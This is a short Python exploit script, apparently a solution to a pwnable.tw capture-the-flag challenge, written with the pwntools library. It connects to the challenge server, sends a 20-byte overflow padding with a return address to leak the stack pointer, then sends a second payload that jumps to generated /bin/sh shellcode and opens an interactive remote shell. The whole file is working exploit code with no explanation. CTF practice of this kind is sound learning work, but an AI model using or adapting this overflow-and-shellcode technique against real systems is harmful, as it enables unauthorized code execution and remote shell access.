from pwn import *
context.arch = 'i386'

import sys
write = sys.stdout.buffer.write

# host = '192.168.122.215'
# port = 8888
host = 'chall.pwnable.tw'
port = 10000

leakesp = 0x08048087

r = remote(host, port)

input('Press Enter to Continue')

r.recvuntil(':')
payload = b'a'*20 + p32(leakesp)
write(payload + b'\n')
r.send(payload)

esp = u32(r.recv(4))
print('address of esp: ' + str(esp))
# r.recvuntil('\0')
sleep(1)
# payload = b'a'*20 + p32(esp + 20) + asm(shellcraft.i386.linux.sh())
# payload = b'a'*20 + p32(esp + 20) + asm(shellcraft.execve('/bin/sh', 0, 0))
payload = b'a'*20 + p32(esp + 20) + asm(shellcraft.linux.sh())
write(payload + b'\n')
r.send(payload)

r.interactive()
